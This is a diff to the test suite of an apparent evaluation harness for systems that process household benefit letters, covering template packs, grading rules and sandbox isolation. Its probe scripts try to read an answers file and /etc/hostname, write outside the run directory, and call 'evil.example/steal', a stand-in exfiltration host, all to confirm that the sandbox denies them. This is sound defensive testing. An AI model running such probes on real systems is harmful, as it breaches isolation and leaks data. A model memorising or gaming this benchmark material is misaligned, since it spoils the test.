@@ -10,7 +10,11 @@ import {
   splitHouseholds,
   STATES,
   requiresForLetter,
+  PUBLIC_PACK,
+  validatePack,
+  loadPrivatePack,
 } from "../src/generator.mjs";
+import fakePackData from "./fixtures/fake-pack.json" with { type: "json" };
 import { rngForHousehold, rngFromString } from "../src/rng.mjs";
 import {
   toBaselineInput,
@@ -31,13 +35,18 @@ import {
   costFromUsage,
   GENERAL_AGENT_MODEL,
 } from "../src/baselines.mjs";
-import { gradeAll, gradeHousehold } from "../src/grader.mjs";
+import { gradeAll, gradeHousehold, formatReport } from "../src/grader.mjs";
 import { checkLinkOffline } from "../src/tools.mjs";
 import { contentHash, renderPhotoSvg, photoFilesByLetter } from "../src/render.mjs";
 import { runSystem } from "../src/harness.mjs";
 import { readRecord, verifyCode, verifyDev, verifyPhotos, verifyHeldout, CODE_FILES } from "../src/verify.mjs";
 
 const reqPhrase = (r) => (typeof r === "string" ? r : r.anyOf.join(" or "));
+
+// The fake pack stands in for the private pack in tests. It is marked fake
+// and validates, so the loader path is exercised without the real pack.
+const FAKE_PACK = validatePack(fakePackData);
+assert.equal(fakePackData.fake, true, "test fixture must stay marked fake");
 
 test("household RNG is deterministic with full-seed streams", () => {
   const a = rngForHousehold("seed-1", "hh-001");
@@ -63,7 +72,7 @@ test("generator is deterministic and covers 120 households in 6 states", () => {
 test("split is 20 dev and 100 held out with separate seeds", () => {
   const dev = generateDevHouseholds();
   assert.equal(dev.length, 20);
-  const heldout = generateHeldoutHouseholds("test-heldout-seed");
+  const heldout = generateHeldoutHouseholds("test-heldout-seed", FAKE_PACK);
   assert.equal(heldout.length, 100);
   const { dev: d2, heldout: h2 } = splitHouseholds(generateHouseholds("s"));
   assert.equal(d2.length, 20);
@@ -77,17 +86,17 @@ test("held-out generator requires the secret seed", () => {
   if (saved !== undefined) process.env.MANO_EVAL_HELDOUT_SEED = saved;
 });
 
-test("template families vary per kind with one held out", () => {
+test("public pack validates and dev draws every public family", () => {
+  assert.deepEqual(Object.keys(PUBLIC_PACK.families).sort(), ["a", "b", "c"]);
   const dev = generateDevHouseholds();
-  const held = generateHeldoutHouseholds("test-heldout-seed");
   const devFams = new Set(dev.flatMap((h) => h.letters.map((l) => l.family)));
-  const heldFams = new Set(held.flatMap((h) => h.letters.map((l) => l.family)));
-  assert.ok(devFams.has("a") && devFams.has("b"), "dev must use families a and b");
-  assert.ok(!devFams.has("c"), "family c stays out of dev");
-  assert.ok(heldFams.has("c"), "held-out must include family c");
+  assert.ok(devFams.has("a") && devFams.has("b") && devFams.has("c"), "dev must use all public families");
+  for (const h of dev) {
+    for (const l of h.letters) assert.equal(l.familyGroup, "public", `${l.letterId} must be group public`);
+  }
   // Same kind in different families reads differently.
   const texts = {};
-  for (const h of held) {
+  for (const h of dev) {
     for (const l of h.letters) {
       if (l.kind === "snap_recert" && ["a", "b", "c"].includes(l.family) && !l.hardCase) {
         texts[l.family] = texts[l.family] || l.text.slice(0, 120);
@@ -97,6 +106,67 @@ test("template families vary per kind with one held out", () => {
   const vals = Object.values(texts);
   assert.ok(vals.length >= 2, "need snap families to compare");
   assert.ok(new Set(vals).size === vals.length, "families must differ");
+});
+
+test("pack validation rejects incomplete and misleading packs", () => {
+  const good = JSON.parse(JSON.stringify(PUBLIC_PACK));
+  assert.equal(validatePack(good), good);
+  const missingKind = JSON.parse(JSON.stringify(PUBLIC_PACK));
+  delete missingKind.families.a.kinds.utility_shutoff;
+  assert.throws(() => validatePack(missingKind), /missing kind/);
+  const noName = JSON.parse(JSON.stringify(PUBLIC_PACK));
+  noName.families.b.needDoc = "- A document, unnamed";
+  assert.throws(() => validatePack(noName), /must carry the document name/);
+  const noDeadline = JSON.parse(JSON.stringify(PUBLIC_PACK));
+  noDeadline.families.c.kinds.work_hours.lead = "Your hours matter to us.";
+  assert.throws(() => validatePack(noDeadline), /must carry a deadline/);
+  assert.throws(() => validatePack({ version: 1, families: {} }), /no families/);
+  assert.throws(() => validatePack({ version: 99, families: PUBLIC_PACK.families }), /version/);
+});
+
+test("private pack loader reads MANO_EVAL_TEMPLATE_PACK and validates", async () => {
+  const saved = process.env.MANO_EVAL_TEMPLATE_PACK;
+  try {
+    delete process.env.MANO_EVAL_TEMPLATE_PACK;
+    assert.throws(() => loadPrivatePack(), /MANO_EVAL_TEMPLATE_PACK is not set/);
+    process.env.MANO_EVAL_TEMPLATE_PACK = new URL("./fixtures/fake-pack.json", import.meta.url).pathname;
+    const pack = loadPrivatePack();
+    assert.deepEqual(Object.keys(pack.families), ["zz"]);
+    const bad = join(tmpdir(), `mano-eval-bad-pack-${Date.now()}.json`);
+    await writeFile(bad, JSON.stringify({ version: 1, families: {} }));
+    process.env.MANO_EVAL_TEMPLATE_PACK = bad;
+    assert.throws(() => loadPrivatePack(), /no families/);
+  } finally {
+    if (saved === undefined) delete process.env.MANO_EVAL_TEMPLATE_PACK;
+    else process.env.MANO_EVAL_TEMPLATE_PACK = saved;
+  }
+});
+
+test("held-out split draws only from the private pack", () => {
+  const { dev, heldout } = splitHouseholds(generateHouseholds("pack-split-seed", FAKE_PACK));
+  for (const h of heldout) {
+    for (const l of h.letters) {
+      assert.equal(l.familyGroup, "private", `${l.letterId} must be group private`);
+      if (!l.kind.startsWith("decoy") && l.lang === "en" && l.hardCase !== "unreadable") {
+        assert.equal(l.family, "zz", `${l.letterId} must use the private family`);
+      }
+    }
+  }
+  const devFams = new Set(dev.flatMap((h) => h.letters.map((l) => l.family)));
+  assert.ok(!devFams.has("zz"), "private families stay out of dev");
+});
+
+test("grader reports scores per template group", () => {
+  const { dev, heldout } = splitHouseholds(generateHouseholds("group-seed", FAKE_PACK));
+  const mixed = [...dev.slice(0, 2), ...heldout.slice(0, 2)];
+  const graded = gradeAll([], mixed);
+  assert.equal(graded.rows.filter((r) => r.group === "public").length, 2);
+  assert.equal(graded.rows.filter((r) => r.group === "private").length, 2);
+  assert.equal(graded.groups.public.households, 2);
+  assert.equal(graded.groups.private.households, 2);
+  const report = formatReport("probe", graded, { costUsd: null, elapsedMs: 1000, mode: "test" });
+  assert.ok(report.includes("group private:"), "report must carry the private group line");
+  assert.ok(report.includes("group public:"), "report must carry the public group line");
 });
 
 test("hard cases land at randomized positions covering all scenarios", () => {
@@ -142,8 +212,9 @@ test("keyed requirements appear in the rendered letter", () => {
       }
     }
     // Packet/request split follows the inventory exactly.
-    const { packet, request } = splitRequires(h.letters.flatMap((l) => l.requires), h.hasDocuments);
+    const { packet, packetGroups, request } = splitRequires(h.letters.flatMap((l) => l.requires), h.hasDocuments);
     assert.deepEqual(h.groundTruth.correctPacket, packet, `${h.householdId} packet must follow the inventory`);
+    assert.deepEqual(h.groundTruth.packetGroups, packetGroups, `${h.householdId} groups must follow the inventory`);
     assert.deepEqual(h.groundTruth.mustRequest, request, `${h.householdId} requests must follow the inventory`);
   }
   const totalRequested = dev.reduce((n, h) => n + h.groundTruth.mustRequest.length, 0);
@@ -175,16 +246,32 @@ test("every requirement stated in a letter is keyed", () => {
   }
 });
 
-test("alternatives split owned members to packet and missing groups to requests", () => {
+test("alternatives stay grouped in the packet and missing groups to requests", () => {
   assert.deepEqual(splitRequires([{ anyOf: ["pay stub", "bank statement"] }], ["bank statement"]), {
-    packet: ["bank statement"], request: [],
+    packet: [], packetGroups: [{ anyOf: ["bank statement"] }], request: [],
+  });
+  assert.deepEqual(splitRequires([{ anyOf: ["pay stub", "bank statement"] }], ["pay stub", "bank statement"]), {
+    packet: [], packetGroups: [{ anyOf: ["bank statement", "pay stub"] }], request: [],
   });
   assert.deepEqual(splitRequires([{ anyOf: ["pay stub", "bank statement"] }], []), {
-    packet: [], request: ["pay stub or bank statement"],
+    packet: [], packetGroups: [], request: ["pay stub or bank statement"],
   });
-  assert.deepEqual(splitRequires(["signed renewal form"], []), { packet: ["signed renewal form"], request: [] });
+  assert.deepEqual(splitRequires(["signed renewal form"], []), { packet: ["signed renewal form"], packetGroups: [], request: [] });
   assert.deepEqual(requiresForLetter("medicaid_renewal", "x")[1], { anyOf: ["pay stub", "bank statement"] });
   assert.deepEqual(requiresForLetter("work_hours", "x"), ["work hours log", { anyOf: ["pay stub", "employer statement"] }]);
+});
+
+test("packet grading accepts either member of an alternative group", () => {
+  const gt = {
+    deadlines: [], correctPacket: ["signed renewal form"], packetGroups: [{ anyOf: ["bank statement", "pay stub"] }],
+    mustRefuse: [], mustRequest: [],
+  };
+  const base = { householdId: "hh-x", status: "ok", reminders: [], refused: [], enforced: [], requested: [], failures: [] };
+  assert.equal(gradeHousehold({ ...base, packet: ["signed renewal form", "pay stub"] }, gt, {}).packetCorrect, true);
+  assert.equal(gradeHousehold({ ...base, packet: ["signed renewal form", "bank statement"] }, gt, {}).packetCorrect, true);
+  assert.equal(gradeHousehold({ ...base, packet: ["signed renewal form", "pay stub", "bank statement"] }, gt, {}).packetCorrect, true);
+  assert.equal(gradeHousehold({ ...base, packet: ["signed renewal form"] }, gt, {}).packetCorrect, false);
+  assert.equal(gradeHousehold({ ...base, packet: ["signed renewal form", "pay stub", "photo ID"] }, gt, {}).packetCorrect, false);
 });
 
 test("conditional deadlines hide the literal date and compute from the interview", () => {
@@ -255,7 +342,7 @@ test("committed dev inputs contain no answer-key fields", async () => {
   const raw = await readFile(new URL("../data/dev.json", import.meta.url), "utf8");
   const dev = JSON.parse(raw);
   assertNoForbiddenFields(dev);
-  for (const f of ["groundTruth", "correctPacket", "mustRefuse", "mustRequest", "hardCase", "requires", "family"]) {
+  for (const f of ["groundTruth", "correctPacket", "mustRefuse", "mustRequest", "hardCase", "requires", "family", "familyGroup"]) {
     assert.ok(!raw.includes(`"${f}"`), `dev.json leaks ${f}`);
   }
 });
@@ -286,15 +373,17 @@ test("baseline source never names answer-key fields", async () => {
 test("subprocess harness isolates the system under test", async () => {
   const dir = await mkdir(join(tmpdir(), `mano-eval-probe-${Date.now()}`), { recursive: true });
   const probe = join(dir, "probe.mjs");
+  const marker = join(dir, "outside-marker.txt");
+  await writeFile(marker, "outside the run dir");
   await writeFile(probe, `import { readFile, writeFile } from "node:fs/promises";
 const args = process.argv.slice(2);
 const input = JSON.parse(await readFile(args[args.indexOf("--input") + 1], "utf8"));
 const verdicts = { envKeys: Object.keys(process.env).sort(), cwd: process.cwd() };
-for (const [name, p] of [["answers", ${JSON.stringify(new URL("../data/dev-answers.json", import.meta.url).pathname)}], ["etc", "/etc/hostname"]]) {
+for (const [name, p] of [["answers", ${JSON.stringify(new URL("../data/dev-answers.json", import.meta.url).pathname)}], ["etc", "/etc/hostname"], ["tmpRead", ${JSON.stringify(marker)}]]) {
   try { await readFile(p); verdicts[name] = "ALLOWED"; } catch (e) { verdicts[name] = e.code; }
 }
 try { await writeFile(${JSON.stringify(join(tmpdir(), "mano-eval-escape.txt"))}, "x"); verdicts.writeOutside = "ALLOWED"; } catch (e) { verdicts.writeOutside = e.code; }
-try { await fetch("https://example.com/"); verdicts.net = "ALLOWED"; } catch (e) { verdicts.net = "DENIED"; }
+try { await fetch("https://example.com/"); verdicts.net = "ALLOWED"; } catch (e) { verdicts.net = (e.cause && e.cause.code) || e.code || "DENIED"; }
 await writeFile(args[args.indexOf("--out") + 1], JSON.stringify(input.map((h) => ({ householdId: h.householdId, verdicts }))));`);
   const saved = process.env.MANO_EVAL_HELDOUT_SEED;
   process.env.MANO_EVAL_HELDOUT_SEED = "probe-fake-seed";
@@ -309,8 +398,9 @@ await writeFile(args[args.indexOf("--out") + 1], JSON.stringify(input.map((h) =>
       assert.ok(o.verdicts.cwd.includes("mano-eval-run-"), "child cwd must be a temp run dir");
       assert.equal(o.verdicts.answers, "ERR_ACCESS_DENIED", "child must not read the answers file");
       assert.equal(o.verdicts.etc, "ERR_ACCESS_DENIED", "child must not read outside allowed paths");
+      assert.equal(o.verdicts.tmpRead, "ERR_ACCESS_DENIED", "child must not read the OS temp dir");
       assert.equal(o.verdicts.writeOutside, "ERR_ACCESS_DENIED", "child must not write outside the run dir");
-      assert.equal(o.verdicts.net, "DENIED", "child must not reach unlisted hosts");
+      assert.equal(o.verdicts.net, "ERR_ACCESS_DENIED", "child network must be denied by the permission model");
     }
   } finally {
     if (saved === undefined) delete process.env.MANO_EVAL_HELDOUT_SEED;
@@ -328,11 +418,100 @@ test("harness turns crashes into household errors, not dead runs", async () => {
   for (const o of outputs) assert.equal(o.status, "error");
 });
 
-test("deterministic parser is the honest bar: it misses only illegible letters", () => {
+// A third-party broker client: self-contained, speaking only the
+// documented IPC protocol, like Mano's own system entry will.
+const BROKER_PROBE_SOURCE = `import { readFile, writeFile } from "node:fs/promises";
+const args = process.argv.slice(2);
+const input = JSON.parse(await readFile(args[args.indexOf("--input") + 1], "utf8"));
+const verdicts = { envKeys: Object.keys(process.env).sort(), hasSend: typeof process.send === "function" };
+try { await fetch("https://example.com/"); verdicts.net = "ALLOWED"; } catch (e) { verdicts.net = (e.cause && e.cause.code) || e.code || "DENIED"; }
+const hello = await new Promise((resolve) => {
+  const t = setTimeout(() => resolve({ keyAvailable: "TIMEOUT" }), 8000);
+  process.on("message", (m) => {
+    if (m && m.channel === "mano-eval-broker-hello") { clearTimeout(t); resolve({ keyAvailable: m.keyAvailable }); }
+  });
+});
+verdicts.hello = hello.keyAvailable;
+let id = 0;
+const pending = new Map();
+process.on("message", (m) => {
+  if (m && m.channel === "mano-eval-broker" && pending.has(m.id)) {
+    const p = pending.get(m.id);
+    pending.delete(m.id);
+    clearTimeout(p.t);
+    if (m.ok) p.resolve(m);
+    else p.reject(new Error(m.error || "denied"));
+  }
+});
+const call = (url, method, body) => new Promise((resolve, reject) => {
+  const i = ++id;
+  const t = setTimeout(() => { pending.delete(i); reject(new Error("timeout")); }, 10000);
+  pending.set(i, { resolve, reject, t });
+  process.send({ channel: "mano-eval-broker", id: i, url, method, headers: {}, body });
+});
+try {
+  const r = await call("https://api.meta.ai/v1/responses", "POST", JSON.stringify({ model: "muse-spark-1.3-contributor" }));
+  verdicts.model = r.ok && r.json && r.json.echo === "model-ok" ? "BROKERED" : "BAD:" + JSON.stringify(r).slice(0, 80);
+} catch (e) { verdicts.model = "ERROR:" + e.message; }
+try {
+  const r = await call("https://evil.example/steal", "GET");
+  verdicts.evil = r.ok ? "ALLOWED" : "DENIED";
+} catch { verdicts.evil = "DENIED"; }
+try {
+  const r = await call("https://api.meta.ai/v1/responses", "GET");
+  verdicts.getModel = r.ok ? "ALLOWED" : "DENIED";
+} catch { verdicts.getModel = "DENIED"; }
+await writeFile(args[args.indexOf("--out") + 1], JSON.stringify(input.map((h) => ({ householdId: h.householdId, verdicts }))));`;
+
+test("brokered child reaches the model only through the parent", async () => {
+  const saved = process.env.META_MODEL_API_KEY;
+  process.env.META_MODEL_API_KEY = "probe-parent-key";
+  try {
+    const dir = await mkdir(join(tmpdir(), `mano-eval-broker-${Date.now()}`), { recursive: true });
+    const probe = join(dir, "broker-probe.mjs");
+    await writeFile(probe, BROKER_PROBE_SOURCE);
+    let sawUrl = null;
+    let sawAuth = null;
+    const fetchImpl = async (url, opts) => {
+      sawUrl = String(url);
+      sawAuth = opts.headers.authorization;
+      return { ok: true, status: 200, json: async () => ({ echo: "model-ok" }) };
+    };
+    const dev = generateDevHouseholds().slice(0, 1);
+    const { outputs } = await runSystem(probe, toBaselineInputs(dev), { envAllow: [], broker: true, fetchImpl });
+    assert.equal(outputs.length, 1);
+    const v = outputs[0].verdicts;
+    assert.equal(v.net, "ERR_ACCESS_DENIED", "child network must be denied by the permission model");
+    assert.equal(v.hello, true, "parent must announce key availability");
+    assert.equal(v.model, "BROKERED", "allowlisted model call must succeed via broker");
+    assert.equal(v.evil, "DENIED", "off-allowlist host must be denied");
+    assert.equal(v.getModel, "DENIED", "wrong method must be denied");
+    assert.equal(sawUrl, "https://api.meta.ai/v1/responses");
+    assert.equal(sawAuth, "Bearer probe-parent-key", "parent must inject the key");
+    assert.ok(!v.envKeys.includes("META_MODEL_API_KEY"), "key leaked to child");
+  } finally {
+    if (saved === undefined) delete process.env.META_MODEL_API_KEY;
+    else process.env.META_MODEL_API_KEY = saved;
+  }
+});
+
+test("broker stays silent unless enabled", async () => {
+  const dir = await mkdir(join(tmpdir(), `mano-eval-nobroker-${Date.now()}`), { recursive: true });
+  const probe = join(dir, "broker-probe.mjs");
+  await writeFile(probe, BROKER_PROBE_SOURCE);
+  const dev = generateDevHouseholds().slice(0, 1);
+  const { outputs } = await runSystem(probe, toBaselineInputs(dev), { envAllow: [] });
+  const v = outputs[0].verdicts;
+  assert.equal(v.hello, "TIMEOUT", "no hello without broker: true");
+  assert.ok(v.model.startsWith("ERROR:"), "model call must fail without a broker");
+});
+
+test("deterministic parser is the honest bar: it misses only illegible or cut-off letters", () => {
   const dev = generateDevHouseholds();
   const inputs = toBaselineInputs(dev);
   const answers = toAnswers(dev);
-  const graded = gradeAll(inputs.map(parserBaseline), answers);
+  const outputs = inputs.map(parserBaseline);
+  const graded = gradeAll(outputs, answers);
   assert.equal(graded.households, 20);
   assert.equal(graded.falseDeadlines, 0, "parser must not guess");
   assert.equal(graded.correctPackets, 20, "parser must match every packet");
@@ -340,9 +519,24 @@ test("deterministic parser is the honest bar: it misses only illegible letters",
   assert.equal(graded.requestedHit, graded.requestedTotal, "parser must request every missing item");
   assert.equal(graded.falseSafety, 0);
   assert.equal(graded.falseRequests, 0);
-  // Every miss is an illegible letter the parser asked about, excluded above.
+  // Every miss is an illegible or cut-off letter the parser asked about.
   for (const row of graded.rows) {
     assert.equal(row.missedDeadlines, 0, `${row.householdId} has unexplained misses`);
+  }
+  // Asking about a cut-off page is honest only when the kept half lost the date.
+  const MONTHS = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+  const SHORT = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
+  const outById = new Map(outputs.map((o) => [o.householdId, o]));
+  for (const h of dev) {
+    const asked = new Set(((outById.get(h.householdId) || {}).failures || []).map((f) => f && f.letterId));
+    const dueByLetter = new Map(h.groundTruth.deadlines.map((d) => [d.letterId, d.dueDate]));
+    for (const l of h.letters) {
+      if (l.hardCase === "cutoff" && asked.has(l.letterId) && dueByLetter.has(l.letterId)) {
+        const [y, m, d] = dueByLetter.get(l.letterId).split("-").map(Number);
+        const forms = [`${MONTHS[m - 1]} ${d}, ${y}`, `${SHORT[m - 1]} ${d}, ${y}`, `${m}/${d}/${y}`];
+        assert.ok(!forms.some((f) => l.text.includes(f)), `${l.letterId} asked but kept its date`);
+      }
+    }
   }
   const reminder = gradeAll(inputs.map(reminderBaseline), answers);
   const hits = (g) => g.deadlinesTotal - g.missedDeadlines;
@@ -410,11 +604,13 @@ test("only ok results earn credit", () => {
   const gt = h.groundTruth;
   // Empty expected packet would otherwise score free.
   const emptyPacket = { deadlines: [], correctPacket: [], mustRefuse: [], mustRequest: [], decoyLetterIds: [] };
-  for (const status of ["invalid", "error", "unsupported", "missing", "not run"]) {
+  for (const status of ["invalid", "error", "unsupported", "missing", "not run", "partial", "done", ""]) {
     const r = gradeHousehold({ householdId: h.householdId, status, reminders: [], packet: [], refused: [], enforced: [], requested: [], failures: [] }, emptyPacket, {});
-    assert.equal(r.packetCorrect, false, `${status} must not earn packet credit`);
-    assert.equal(r.failures, 1, `${status} with no reported failure derives one`);
+    assert.equal(r.packetCorrect, false, `${JSON.stringify(status)} must not earn packet credit`);
+    assert.equal(r.failures, 1, `${JSON.stringify(status)} with no reported failure derives one`);
   }
+  const malformed = gradeHousehold({ householdId: h.householdId, status: "ok", reminders: "not-an-array", packet: [], refused: [], enforced: [], requested: [], failures: [] }, emptyPacket, {});
+  assert.equal(malformed.packetCorrect, false, "ok with an invalid shape must not earn credit");
   const m = gt.mustRefuse[0];
   const r2 = gradeHousehold({ householdId: h.householdId, status: "ok", reminders: [], packet: [], refused: [m], enforced: [], requested: [], failures: [] }, gt, {});
   assert.equal(r2.safetyModel, 1);
@@ -436,7 +632,7 @@ test("unnecessary refusals and requests count as errors", () => {
   assert.equal(r.falseRequests, 1);
 });
 
-test("illegible letters score only when the system asks", () => {
+test("unreadable letters never earn deadline credit; asking scores separately", () => {
   const dev = generateDevHouseholds();
   const found = dev.flatMap((h) => h.letters.map((l) => ({ h, l }))).find(({ l }) => l.hardCase === "unreadable" && !l.kind.startsWith("decoy"));
   assert.ok(found, "need an illegible action letter");
@@ -448,14 +644,19 @@ test("illegible letters score only when the system asks", () => {
     requested: h.groundTruth.mustRequest, failures: [{ letterId: l.letterId, reason: "unreadable" }],
   }, h.groundTruth, info);
   const gtCount = h.groundTruth.deadlines.length;
-  assert.equal(asked.deadlinesTotal, gtCount - 1, "asked illegible letter excluded");
+  assert.equal(asked.deadlinesTotal, gtCount - 1, "unreadable letter excluded from deadlines");
   assert.equal(asked.missedDeadlines, asked.deadlinesTotal, "no predictions means all counted letters missed");
+  assert.equal(asked.unreadableTotal, 1);
+  assert.equal(asked.unreadableAsked, 1, "asking for a readable copy scores");
   const guessed = gradeHousehold({
     householdId: h.householdId, status: "ok",
     reminders: h.groundTruth.deadlines.map((d) => ({ letterId: d.letterId, dueDate: d.dueDate })),
     packet: [], refused: [], enforced: [], requested: [], failures: [],
   }, h.groundTruth, info);
-  assert.equal(guessed.deadlinesTotal, gtCount, "guessed illegible letter still counts");
+  assert.equal(guessed.deadlinesTotal, gtCount - 1, "guessed unreadable letter stays excluded");
+  assert.equal(guessed.deadlinesHit, gtCount - 1, "only visible letters hit");
+  assert.equal(guessed.unreadableAsked, 0);
+  assert.equal(guessed.falseDeadlines, 1, "the invisible guess is a false prediction");
 });
 
 test("strict schema rejects empty and off-shape output", () => {
@@ -624,8 +825,9 @@ test("photo answers slice to photographed letters and stay text-derived", async 
   assert.ok(entry);
   assert.deepEqual(Object.keys(entry.letters).sort(), [...keep].sort());
   const keptReq = h.letters.filter((l) => keep.includes(l.letterId)).flatMap((l) => l.requires);
-  const { packet, request } = splitRequires(keptReq, h.hasDocuments);
+  const { packet, packetGroups, request } = splitRequires(keptReq, h.hasDocuments);
   assert.deepEqual(entry.groundTruth.correctPacket, packet);
+  assert.deepEqual(entry.groundTruth.packetGroups, packetGroups);
   assert.deepEqual(entry.groundTruth.mustRequest, request);
 });
 
@@ -639,6 +841,7 @@ test("freeze record commits hashes only, never the seed", async () => {
   const raw = await readFile(new URL("../data/heldout-hashes.json", import.meta.url), "utf8");
   const record = JSON.parse(raw);
   assert.ok(record.frozen && record.seedCommitment && record.manifest, "record needs freeze metadata");
+  assert.match(record.privatePack || "", /^[0-9a-f]{64}$/, "record must commit the private pack SHA-256");
   assert.ok(record.dev.inputs && record.dev.answers, "record needs dev hashes");
   assert.deepEqual(Object.keys(record.code).sort(), [...CODE_FILES].sort(), "record must pin every scoring-path file");
   assert.ok(Object.keys(record.photos).length > 40, "record must hash every committed photo");
@@ -660,8 +863,8 @@ test("frozen commitments verify without a key", async () => {
 
 test("frozen held-out set verifies with the seed", async () => {
   const seed = process.env.MANO_EVAL_HELDOUT_SEED;
-  if (!seed) {
-    console.log("  (skipped: no MANO_EVAL_HELDOUT_SEED)");
+  if (!seed || !process.env.MANO_EVAL_TEMPLATE_PACK) {
+    console.log("  (skipped: needs MANO_EVAL_HELDOUT_SEED and MANO_EVAL_TEMPLATE_PACK)");
     return;
   }
   const record = await readRecord();
@@ -669,6 +872,29 @@ test("frozen held-out set verifies with the seed", async () => {
   assert.equal(record.seedCommitment, createHash("sha256").update(seed).digest("hex"), "seed must match the commitment");
   const heldout = await verifyHeldout(record, seed);
   assert.deepEqual(heldout.mismatches, [], "regenerated held-out must match the record");
+});
+
+test("verify rejects a swapped private pack", async () => {
+  const seed = process.env.MANO_EVAL_HELDOUT_SEED;
+  if (!seed) {
+    console.log("  (skipped: needs MANO_EVAL_HELDOUT_SEED)");
+    return;
+  }
+  const saved = process.env.MANO_EVAL_TEMPLATE_PACK;
+  try {
+    // A valid pack with different bytes: still loads, but the hash check fails.
+    const tampered = JSON.parse(JSON.stringify(fakePackData));
+    tampered.families.zy = JSON.parse(JSON.stringify(fakePackData.families.zz));
+    const swapped = join(tmpdir(), `mano-eval-swapped-pack-${Date.now()}.json`);
+    await writeFile(swapped, JSON.stringify(tampered));
+    process.env.MANO_EVAL_TEMPLATE_PACK = swapped;
+    const record = await readRecord();
+    const heldout = await verifyHeldout(record, seed);
+    assert.ok(heldout.mismatches.includes("private pack hash"), "swapped pack must fail the hash check");
+  } finally {
+    if (saved === undefined) delete process.env.MANO_EVAL_TEMPLATE_PACK;
+    else process.env.MANO_EVAL_TEMPLATE_PACK = saved;
+  }
 });
 
 test("no held-out photos persist inside the repo", async () => {
